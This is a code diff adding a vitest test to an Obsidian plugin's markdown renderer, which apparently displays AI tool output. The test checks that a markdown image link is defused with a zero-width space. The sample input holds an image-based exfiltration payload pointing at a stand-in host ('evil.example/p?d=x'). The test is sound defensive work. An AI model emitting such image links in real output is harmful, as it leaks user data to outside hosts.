@@ -1,5 +1,25 @@
-import { describe, expect, it } from 'vitest';
-import { describeToolResult, describeToolUse } from './block-renderer';
+import { describe, expect, it, vi } from 'vitest';
+import { MarkdownRenderer } from 'obsidian';
+import {
+  describeToolResult,
+  describeToolUse,
+  renderMarkdownInto,
+} from './block-renderer';
+
+vi.mock('obsidian', async (importOriginal) => ({
+  ...(await importOriginal<object>()),
+  MarkdownRenderer: { render: vi.fn() },
+}));
+
+describe('renderMarkdownInto', () => {
+  it('hands the renderer neutralized text', async () => {
+    const el = { addClass: vi.fn() } as unknown as HTMLElement;
+    const ctx = { app: {}, component: {} } as Parameters<typeof renderMarkdownInto>[2];
+    await renderMarkdownInto(el, 'Done ![](https://evil.example/p?d=x)', ctx);
+    const md = vi.mocked(MarkdownRenderer.render).mock.calls[0][1];
+    expect(md).toBe('Done !\u200b[](https://evil.example/p?d=x)');
+  });
+});
 
 describe('describeToolUse', () => {
   it('renders read_note with the path', () => {
